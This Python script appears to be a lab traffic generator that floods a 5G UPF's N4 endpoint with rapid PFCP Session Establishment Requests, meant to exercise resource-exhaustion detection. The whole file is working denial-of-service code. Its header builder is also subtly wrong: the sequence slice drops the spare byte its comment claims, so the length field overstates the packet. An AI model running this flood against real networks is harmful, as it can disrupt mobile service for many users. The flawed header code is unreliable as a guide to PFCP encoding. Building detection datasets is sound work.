#!/usr/bin/env python3
"""N4 PFCP Session Establishment flood (label: pfcp_session_flood).

Sends a rapid burst of PFCP Session Establishment Requests to the UPF's N4
endpoint to exercise session-rate / resource-exhaustion detection. Uses minimal
hand-built PFCP headers (TS 29.244) — enough to be recognizably PFCP on the
wire for feature extraction; not a full stack.

Lab-only. See ../_common.py.
"""
import os, sys, time, struct, socket, random
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from _common import base_parser, assert_lab_target  # noqa: E402

PFCP_PORT = 8805
MSG_SESSION_EST_REQ = 50  # PFCP message type (TS 29.244)


def pfcp_header(msg_type: int, seid: int, seq: int, body: bytes) -> bytes:
    # Flags: version=1 (001 in top 3 bits) + S-bit (SEID present) = 0x21
    flags = 0x21
    length = 12 + len(body)  # SEID(8) + seq(3) + spare(1) + body
    return (struct.pack("!BBH", flags, msg_type, length)
            + struct.pack("!Q", seid)
            + struct.pack("!I", (seq << 8))[0:3]  # 3-byte seq + 1 spare via slice
            + body)


def main() -> None:
    args = base_parser(__doc__, PFCP_PORT).parse_args()
    assert_lab_target(args.target, args.ack)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interval = 1.0 / args.rate if args.rate > 0 else 0
    print(f"[pfcp_session_flood] -> {args.target}:{args.port} count={args.count} rate~{args.rate}/s")
    for seq in range(1, args.count + 1):
        seid = random.getrandbits(64)
        # minimal body: a Node ID IE stub (type 60) so it parses as PFCP-ish
        body = struct.pack("!HH", 60, 5) + b"\x00" + socket.inet_aton(args.target)
        pkt = pfcp_header(MSG_SESSION_EST_REQ, seid, seq, body)
        sock.sendto(pkt, (args.target, args.port))
        if interval:
            time.sleep(interval)
    print(f"[pfcp_session_flood] sent {args.count} establishment requests.")


if __name__ == "__main__":
    main()
